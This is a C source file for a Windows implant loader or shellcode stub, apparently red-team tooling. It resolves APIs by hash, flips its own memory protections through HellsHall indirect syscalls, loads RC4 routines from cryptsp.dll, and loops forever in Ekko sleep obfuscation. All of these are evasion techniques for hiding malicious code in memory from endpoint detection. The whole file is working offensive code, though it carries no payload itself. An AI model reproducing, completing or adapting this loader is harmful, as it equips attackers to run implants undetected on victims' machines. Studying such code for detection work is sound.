#include <Core.h>
#include <Win32.h>
#include <Structs.h>
#include <HellsHall.h>
#include <Sleep.h>
#include <Macros.h>

#ifdef ISDLL
  #define EXPORT __declspec(dllexport)
  EXPORT BOOL WINAPI DllMain( HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved )
  {
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
         {
            Entry();
            break;
         }

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
        if (lpvReserved != NULL)
        {
            break; // do not do cleanup if process termination scenario
        }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
  }
#endif

SEC( text, B ) VOID Entry( VOID ) 
{

    MyStruct    S           = { 0 };
    NTDLL       NtdllSt     = { 0 };
    SysFunc     sF          = { 0 };
    InitilizeSysFunc(NtProtectVirtualMemory_CRC32b, &NtdllSt, &sF);
    getSysFuncStruct(&S.NtProtectVirtualMemory, &sF);
    
    PVOID RealInstanceAddressCopy = ( ((SIZE_T)Start ) + (int)(PBYTE)(&InstancePlaceholder) );
    PVOID temp = NULL;
    SIZE_T size = sizeof(InstancePlaceholder);
    SetConfig(S.NtProtectVirtualMemory.wSSN, S.NtProtectVirtualMemory.pInst);
    NTSTATUS status = HellHall(NtCurrentProcess(), &RealInstanceAddressCopy, &size, PAGE_READWRITE, &temp);

    PINSTANCE Instance = ( ((SIZE_T)Start ) + (int)(PBYTE)(&InstancePlaceholder) );

    Instance->Modules.Kernel32   = LdrModulePeb ( HASH_KERNEL32 ); 
    Instance->Modules.Ntdll      = LdrModulePeb ( HASH_NTDLL ); 
    Instance->Win32.LoadLibraryA = LdrFunction (Instance->Modules.Kernel32, 0xb7072fdb);

    Instance->Modules.Msvcrt     = Instance->Win32.LoadLibraryA( "msvcrt.dll" );
    Instance->Modules.Cryptsp     = Instance->Win32.LoadLibraryA( "cryptsp.dll" );

    Instance->Win32.RtlCaptureContext = LdrFunction (Instance->Modules.Kernel32, 0xeba8d910);

    Instance->Win32.printf = LdrFunction (Instance->Modules.Msvcrt, 0xc870eef8);
    Instance->Win32.NtContinue = LdrFunction (Instance->Modules.Ntdll, 0xfc3a6c2c);
    Instance->Win32.NtWaitForSingleObject  = LdrFunction (Instance->Modules.Ntdll, 0xe8ac0c3c);
    Instance->Win32.NtSetEvent = LdrFunction (Instance->Modules.Ntdll, 0xcb87d8b5);
    Instance->Win32.NtCreateEvent = LdrFunction (Instance->Modules.Ntdll, 0x28d3233d);
    Instance->Win32.RtlCreateTimerQueue = LdrFunction (Instance->Modules.Ntdll, 0x50ef3c31);
    Instance->Win32.RtlCreateTimer = LdrFunction (Instance->Modules.Ntdll, 0x1877faec);
    Instance->Win32.RtlDeleteTimerQueueEx = LdrFunction (Instance->Modules.Ntdll, 0xa5467ded);
    Instance->Win32.RtlCopyMappedMemory  = LdrFunction (Instance->Modules.Ntdll, 0x5b56b302);
    Instance->Win32.NtSignalAndWaitForSingleObject = LdrFunction (Instance->Modules.Ntdll, 0x78983aed);
    Instance->Win32.NtSetContextThread = LdrFunction (Instance->Modules.Ntdll, 0xffa0bf10);
    Instance->Win32.NtDuplicateObject = LdrFunction (Instance->Modules.Ntdll, 0x4441d859);
    Instance->Win32.NtGetContextThread = LdrFunction (Instance->Modules.Ntdll, 0x6d22f884);

    Instance->Win32.SystemFunction032 = LdrFunction (Instance->Modules.Cryptsp, 0xe58c8805);

    SetConfig(S.NtProtectVirtualMemory.wSSN, S.NtProtectVirtualMemory.pInst);
    status = HellHall(NtCurrentProcess(), &RealInstanceAddressCopy, &size, PAGE_EXECUTE_READ, &temp);
    Instance->Win32.printf( "[INFO] NtProtect status was 0x%llx\n", status );

    Instance->Win32.printf( "[INFO] __builtin_return_address from Main is 0x%llx\n", __builtin_return_address(0) );
    do
        // Start Sleep Obfuscation by da spider
        Ekko( (long)10 * (long)1000 );
    while ( TRUE );
    
    
} 

